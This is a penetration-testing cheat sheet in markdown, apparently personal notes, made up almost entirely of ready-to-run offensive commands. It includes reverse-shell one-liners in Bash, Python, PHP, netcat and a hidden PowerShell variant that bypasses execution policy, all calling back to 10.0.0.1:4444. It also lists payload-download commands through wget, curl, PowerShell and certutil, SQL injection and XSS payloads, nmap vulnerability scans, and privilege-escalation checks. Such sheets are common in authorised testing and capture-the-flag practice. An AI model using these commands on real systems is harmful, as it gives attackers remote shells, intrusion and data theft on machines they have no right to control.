# Cheatsheets

## Reverse Shells

### Bash
```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

### Python
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP
```php
php -r '$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Netcat
```bash
nc -e /bin/sh 10.0.0.1 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
```

### PowerShell
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## File Transfer

### HTTP Server
```bash
# Python 3
python3 -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000
```

### Download Files
```bash
# wget
wget http://10.0.0.1:8000/file

# curl
curl http://10.0.0.1:8000/file -o file

# PowerShell
Invoke-WebRequest -Uri http://10.0.0.1:8000/file -OutFile file
(New-Object Net.WebClient).DownloadFile('http://10.0.0.1:8000/file','C:\file')

# certutil (Windows)
certutil -urlcache -f http://10.0.0.1:8000/file file
```

## SQL Injection

```sql
' OR '1'='1
' UNION SELECT NULL--
' UNION SELECT @@version--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
```

## XSS

```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

## Nmap

```bash
# Basic scan
nmap -sC -sV -p- TARGET

# Aggressive scan
nmap -A -T4 TARGET

# Vulnerability scan
nmap --script vuln TARGET
```

## Privilege Escalation

### Linux SUID
```bash
find / -perm -u=s -type f 2>/dev/null
```

### Linux Capabilities
```bash
getcap -r / 2>/dev/null
```

### Windows AlwaysInstallElevated
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

## Referencias

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.xyz/)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
